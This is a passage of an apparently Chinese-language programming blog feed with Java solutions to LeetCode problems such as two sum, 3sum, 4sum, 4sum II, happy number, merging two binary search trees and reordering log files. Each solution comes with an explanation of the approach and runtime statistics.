<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(n !=<span class="number">1</span> &amp;&amp; !set.contains(n))&#123;</span><br><span class="line">            set.add(n);</span><br><span class="line">            n = getNextNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNextNumber</span><span class="params">(<span class="type">int</span> n )</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> n%<span class="number">10</span>;</span><br><span class="line">            res += temp*temp;</span><br><span class="line">            n = n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了80.81%的用户</li>
<li>内存消耗：38.5 MB, 在所有 Java 提交中击败了66.50%的用户</li>
<li>通过测试用例：404 &#x2F; 404</li>
</ul>
<h1 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a></h1><blockquote>
<p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [2,7,11,15], target &#x3D; 9<br>输出：[0,1]<br>解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</p>
</blockquote>
<h2 id="思路：哈希-1"><a href="#思路：哈希-1" class="headerlink" title="思路：哈希"></a>思路：哈希</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(target-nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i,map.get(target-nums[i])&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(nums[i],i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="454-四数相加-II"><a href="#454-四数相加-II" class="headerlink" title="454. 四数相加 II"></a><a href="https://leetcode-cn.com/problems/4sum-ii/">454. 四数相加 II</a></h1><blockquote>
<p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有多少个元组 (i, j, k, l) 能满足：</p>
<p>0 &lt;&#x3D; i, j, k, l &lt; n<br>nums1[i] + nums2[j] + nums3[k] + nums4[l] &#x3D;&#x3D; 0</p>
<p>示例 1：</p>
<p>输入：nums1 &#x3D; [1,2], nums2 &#x3D; [-2,-1], nums3 &#x3D; [-1,2], nums4 &#x3D; [0,2]<br>输出：2<br>解释：<br>两个元组如下：</p>
<ol>
<li>(0, 0, 0, 1) -&gt; nums1[0] + nums2[0] + nums3[0] + nums4[1] &#x3D; 1 + (-2) + (-1) + 2 &#x3D; 0</li>
<li>(1, 1, 0, 0) -&gt; nums1[1] + nums2[1] + nums3[0] + nums4[0] &#x3D; 2 + (-1) + (-1) + 0 &#x3D; 0</li>
</ol>
</blockquote>
<h2 id="思路：分组-哈希表"><a href="#思路：分组-哈希表" class="headerlink" title="思路：分组+哈希表"></a>思路：分组+哈希表</h2><p>我们可以将四个数组分成两部分，AA 和 BB 为一组，CC 和 DD 为另外一组。</p>
<p>对于 A 和 B，我们使用二重循环对它们进行遍历，得到所有 A[i]+B[j] 的值并存入哈希映射中。对于哈希映射中的每个键值对，每个键表示一种 A[i]+B[j]，对应的值为 A[i]+B[j] 出现的次数。</p>
<p>对于 C和 D，我们同样使用二重循环对它们进行遍历。当遍历到 C[k]+D[l] 时，如果 -(C[k]+D[l]) 出现在哈希映射中，那么将−(C[k]+D[l]) 对应的值累加进答案中。</p>
<p>最终即可得到满足 A[i]+B[j]+C[k]+D[l]&#x3D;0 的四元组数目。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; AB = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> u:nums1)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> v:nums2)&#123;</span><br><span class="line">                AB.put(u+v,AB.getOrDefault(u+v,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> u:nums3)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> v:nums4)&#123;</span><br><span class="line">                <span class="keyword">if</span>(AB.containsKey(-u-v))&#123;</span><br><span class="line">                    ans += AB.get(-u-v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode-cn.com/problems/3sum/">15. 三数之和</a></h1><blockquote>
<p>给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？请你找出所有和为 0 且不重复的三元组。</p>
<p>注意：答案中不可以包含重复的三元组。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：nums = [-<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">4</span>]</span><br><span class="line">输出：[[-<span class="number">1</span>,-<span class="number">1</span>,<span class="number">2</span>],[-<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：排序-双指针"><a href="#思路：排序-双指针" class="headerlink" title="思路：排序+双指针"></a>思路：排序+双指针</h2><p>本题难点在于：如何去除重复解。</p>
<p>由于题目要求不可以包含重复的三元组，所以，并不适合使用哈希</p>
<p>算法流程：</p>
<ul>
<li>1、特判，对于数组长度 nn，如果数组为 null 或者数组长度小于 33，返回 []。</li>
<li>2、对数组进行排序。</li>
<li>3、遍历排序后数组：<ul>
<li>若 nums[i]&gt;0：因为已经排序好，所以后面不可能有三个数加和等于 0，直接返回结果。</li>
<li>对于重复元素：跳过，避免出现重复解</li>
</ul>
</li>
<li>令左指针 L&#x3D;i+1，右指针 R&#x3D;len-1，当 L&lt;R 时，执行循环：<ul>
<li>当 nums[i]+nums[L]+nums[R]&#x3D;&#x3D;0，执行循环，判断左界和右界是否和下一位置重复，去除重复解。并同时将 L,R 移到下一位置，寻找新的解</li>
<li>若和大于 0，说明 nums[R]太大，R 左移</li>
<li>若和小于 0，说明 nums[L] 太小，L 右移</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || len &lt; <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对原数组进行排序</span></span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt;len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">//去重</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span> , right = len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum == <span class="number">0</span>)&#123;</span><br><span class="line">                    ans.add(Arrays.asList(nums[i],nums[left],nums[right]));</span><br><span class="line">                    <span class="keyword">while</span>(left &lt; right &amp;&amp; nums[left] == nums[left+<span class="number">1</span>])&#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span>(left &lt; right &amp;&amp; nums[right] == nums[right-<span class="number">1</span>])&#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：20 ms, 在所有 Java 提交中击败了78.19%的用户</li>
<li>内存消耗：45.5 MB, 在所有 Java 提交中击败了47.03%的用户</li>
<li>通过测试用例：318 &#x2F; 318</li>
</ul>
<h1 id="18-四数之和"><a href="#18-四数之和" class="headerlink" title="18. 四数之和"></a><a href="https://leetcode-cn.com/problems/4sum/">18. 四数之和</a></h1><blockquote>
<p>给你一个由 n 个整数组成的数组 nums ，和一个目标值 target 。请你找出并返回满足下述全部条件且不重复的四元组 [nums[a], nums[b], nums[c], nums[d]] （若两个四元组元素一一对应，则认为两个四元组重复）：</p>
<p>0 &lt;&#x3D; a, b, c, d &lt; n<br>a、b、c 和 d 互不相同<br>nums[a] + nums[b] + nums[c] + nums[d] &#x3D;&#x3D; target<br>你可以按 任意顺序 返回答案 。</p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [1,0,-1,0,-2,2], target &#x3D; 0<br>输出：[[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]</p>
</blockquote>
<h2 id="思路：排序-双指针-1"><a href="#思路：排序-双指针-1" class="headerlink" title="思路：排序+双指针"></a>思路：排序+双指针</h2><p>和三数之和一样，只是多了一层for循环。</p>
<p>使用四个指针(a&lt;b&lt;c&lt;d)。固定最小的a和b在左边，c&#x3D;b+1,d&#x3D;len-1 移动两个指针包夹求解。<br> 保存使得nums[a]+nums[b]+nums[c]+nums[d]&#x3D;&#x3D;target的解。偏大时d左移，偏小时c右移。c和d相遇时，表示以当前的a和b为最小值的解已经全部求得。b++,进入下一轮循环b循环，当b循环结束后。 a++，进入下一轮a循环。 即(a在最外层循环，里面嵌套b循环，再嵌套双指针c,d包夹求解)。</p>
<p><strong>上面的解法存在重复解的原因是因为移动指针时可能出现重复数字的情况</strong>。所以我们要确保移动指针后， 对应的数字要发生改变才行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || len &lt; <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(nums);	<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])&#123;	<span class="comment">//确保nums[i] 改变了</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span> ; j &lt; len ; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j &gt; i +<span class="number">1</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>])&#123;	<span class="comment">//确保nums[j] 改变了</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> j + <span class="number">1</span>,right = len-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[j] + nums[left] +nums[right];</span><br><span class="line">                    <span class="keyword">if</span>(sum &gt; target )&#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; target)&#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        ans.add(Arrays.asList(nums[i],nums[j],nums[left],nums[right]));</span><br><span class="line">                        <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right-<span class="number">1</span>]) right--;	<span class="comment">//确保nums[right] 改变了</span></span><br><span class="line">                        <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[left] == nums[left+<span class="number">1</span>])   left++;		<span class="comment">//确保nums[left] 改变了</span></span><br><span class="line"></span><br><span class="line">                        left++;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：13 ms, 在所有 Java 提交中击败了64.30%的用户</li>
<li>内存消耗：41.6 MB, 在所有 Java 提交中击败了70.32%的用户</li>
<li>通过测试用例：289 &#x2F; 289</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title>每日一题——May</title>
    <url>/2022/05/01/15-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98May/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>5月份每日一题记录~</p>
<h1 id="1305-两棵二叉搜索树中的所有元素"><a href="#1305-两棵二叉搜索树中的所有元素" class="headerlink" title="1305. 两棵二叉搜索树中的所有元素"></a><a href="https://leetcode-cn.com/problems/all-elements-in-two-binary-search-trees/">1305. 两棵二叉搜索树中的所有元素</a></h1><blockquote>
<p>给你 <code>root1</code> 和 <code>root2</code> 这两棵二叉搜索树。请你返回一个列表，其中包含 <strong>两棵树</strong> 中的所有整数并按 <strong>升序</strong> 排序。.</p>
</blockquote>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/12/29/q2-e1.png" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root1 = [2,1,4], root2 = [1,0,3]</span><br><span class="line">输出：[0,1,1,2,3,4]</span><br></pre></td></tr></table></figure>

<h2 id="思路：中序遍历-归并"><a href="#思路：中序遍历-归并" class="headerlink" title="思路：中序遍历+归并"></a>思路：中序遍历+归并</h2><p>回顾二叉搜索树的定义：</p>
<ul>
<li><p>当前节点的左子树中的数均小于当前节点的数；</p>
</li>
<li><p>当前节点的右子树中的数均大于当前节点的数；</p>
</li>
<li><p>所有左子树和右子树自身也是二叉搜索树。</p>
</li>
</ul>
<p>根据上述定义，我们可以用中序遍历访问二叉搜索树，即按照访问左子树——根节点——右子树的方式遍历这棵树，而在访问左子树或者右子树的时候也按照同样的方式遍历，直到遍历完整棵树。遍历结束后，就得到了一个有序数组。</p>
<p>由于整个遍历过程天然具有递归的性质，我们可以直接用<strong>递归函数</strong>来模拟这一过程。具体描述见 94. 二叉树的中序遍历 的 官方题解。</p>
<p>中序遍历这两棵二叉搜索树，可以得到两个有序数组。然后可以使用双指针方法来合并这两个有序数组，这一方法将两个数组看作两个队列，每次从队列头部取出比较小的数字放到结果中（头部相同时可任取一个）。如下面的动画所示：</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/88/1.gif" alt="https://assets.leetcode-cn.com/solution-static/88/1.gif"></p>
<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">getAllElements</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; nums1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        List&lt;Integer&gt; nums2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        inorder(root1,nums1);</span><br><span class="line">        inorder(root2,nums2);</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="number">0</span> ,p2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1 == nums1.size())&#123;</span><br><span class="line">                ans.addAll(nums2.subList(p2,nums2.size()));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p2 == nums2.size())&#123;</span><br><span class="line">                ans.addAll(nums1.subList(p1,nums1.size()));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums1.get(p1) &lt; nums2.get(p2))&#123;</span><br><span class="line">                ans.add(nums1.get(p1++));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans.add(nums2.get(p2++));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root , List&lt;Integer&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            inorder(root.left,res);</span><br><span class="line">            res.add(root.val);</span><br><span class="line">            inorder(root.right,res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：17 ms, 在所有 Java 提交中击败了65.99%的用户，O（m+n），其中 n 和 m分别为两棵二叉搜索树的节点个数</li>
<li>内存消耗：43.8 MB, 在所有 Java 提交中击败了35.23%的用户，O（m+n）</li>
<li>通过测试用例：48 &#x2F; 48</li>
</ul>
<h1 id="937-重新排列日志文件"><a href="#937-重新排列日志文件" class="headerlink" title="937. 重新排列日志文件"></a><a href="https://leetcode-cn.com/problems/reorder-data-in-log-files/">937. 重新排列日志文件</a></h1><blockquote>
<p>给你一个日志数组 logs。每条日志都是以空格分隔的字串，其第一个字为字母与数字混合的 标识符 。</p>
<p>有两种不同类型的日志：</p>
<p>字母日志：除标识符之外，所有字均由小写字母组成<br>数字日志：除标识符之外，所有字均由数字组成<br>请按下述规则将日志重新排序：</p>
<p>所有 字母日志 都排在 数字日志 之前。<br>字母日志 在内容不同时，忽略标识符后，按内容字母顺序排序；在内容相同时，按标识符排序。<br>数字日志 应该保留原来的相对顺序。<br>返回日志的最终顺序。</p>
<p>输入：logs &#x3D; [“dig1 8 1 5 1”,”let1 art can”,”dig2 3 6”,”let2 own kit dig”,”let3 art zero”]<br>输出：[“let1 art can”,”let3 art zero”,”let2 own kit dig”,”dig1 8 1 5 1”,”dig2 3 6”]<br>解释：<br>字母日志的内容都不同，所以顺序为 “art can”, “art zero”, “own kit dig” 。<br>数字日志保留原来的相对顺序 “dig1 8 1 5 1”, “dig2 3 6” 。</p>
</blockquote>
<h2 id="思路：定义类-排序"><a href="#思路：定义类-排序" class="headerlink" title="思路：定义类+排序"></a>思路：定义类+排序</h2><p>这个题是一个直接模拟的题目，但个人觉得困难在于实现，写的时候也是参考了官方解写的。。</p>
<p>根据题意自定义排序的比较方式。比较时，先将数组日志按照<strong>第一个空格分成两部分字符串</strong>，其中第一部分为标识符。第二部分的首字符可以用来判断该日志的类型。两条日志进行比较时，需要先确定待比较的日志的类型，然后按照以下规则进行比较：</p>
<ul>
<li><p>字母日志始终小于数字日志。</p>
</li>
<li><p>数字日志保留原来的相对顺序。当使用稳定的排序算法时，可以认为所有数字日志大小一样。当使用不稳定的排序算法时，可以用日志在原数组中的下标进行比较。</p>
</li>
<li><p>字母日志进行相互比较时，先比较第二部分的大小；如果相等，则比较标识符大小。比较时都使用字符串的比较方式进行比较。</p>
</li>
</ul>
<p>定义比较函数logCompare 时，有两个输入 log 1和 log 2 。当相等时，返回 0；当 log 1大时，返回正数；当 log 2大时，返回负数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String[] reorderLogFiles(String[] logs) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> logs.length;</span><br><span class="line">        Pair[] arr = <span class="keyword">new</span> <span class="title class_">Pair</span>[len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;len ; i++)&#123;</span><br><span class="line">            arr[i] = <span class="keyword">new</span> <span class="title class_">Pair</span>(logs[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(arr,(a,b) -&gt; logCompare(a,b));</span><br><span class="line">        String[] ans = <span class="keyword">new</span> <span class="title class_">String</span>[len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;len ; i++)&#123;</span><br><span class="line">            ans[i] = arr[i].log;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">logCompare</span><span class="params">(Pair pair1, Pair pair2)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">log1</span> <span class="operator">=</span> pair1.log , log2 = pair2.log;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> pair1.index , index2 = pair2.index;</span><br><span class="line">        <span class="comment">//将数组以空格分割为两段，第一段为标识符</span></span><br><span class="line">        String[] split1 = log1.split(<span class="string">&quot; &quot;</span>,<span class="number">2</span>);</span><br><span class="line">        String[] split2 = log2.split(<span class="string">&quot; &quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//判断第二段是字母日志还是数字日志</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDigit1</span> <span class="operator">=</span> Character.isDigit(split1[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDigit2</span> <span class="operator">=</span> Character.isDigit(split2[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isDigit1 &amp;&amp; isDigit2)&#123;</span><br><span class="line">            <span class="comment">//如果都为数字日志</span></span><br><span class="line">            <span class="keyword">return</span> index1 - index2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!isDigit1&amp;&amp;!isDigit2)&#123;</span><br><span class="line">            <span class="comment">//如果都为字母日志</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sc</span> <span class="operator">=</span> split1[<span class="number">1</span>].compareTo(split2[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(sc!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> sc;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果第二段相等，则比较标识符</span></span><br><span class="line">            <span class="keyword">return</span> split1[<span class="number">0</span>].compareTo(split2[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果pair1为数字日志，其始终比字母日志大，所以直接返回1</span></span><br><span class="line">        <span class="keyword">return</span> isDigit1?<span class="number">1</span>:-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Pair</span>&#123;</span><br><span class="line">        String log;</span><br><span class="line">        <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Pair</span><span class="params">(String log, <span class="type">int</span> index)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.log = log;</span><br><span class="line">            <span class="built_in">this</span>.index = index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：5 ms, 在所有 Java 提交中击败了82.98%的用户,O*(<em>n</em>log*n)，其中 n 是 logs 的字符数，是平均情况下内置排序的时间复杂度</li>
<li>内存消耗：41.3 MB, 在所有 Java 提交中击败了92.73%的用户</li>
<li>通过测试用例：65 &#x2F; 65</li>
</ul>
<h1 id="1823-找出游戏的获胜者"><a href="#1823-找出游戏的获胜者" class="headerlink" title="1823. 找出游戏的获胜者"></a><a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></h1><blockquote>
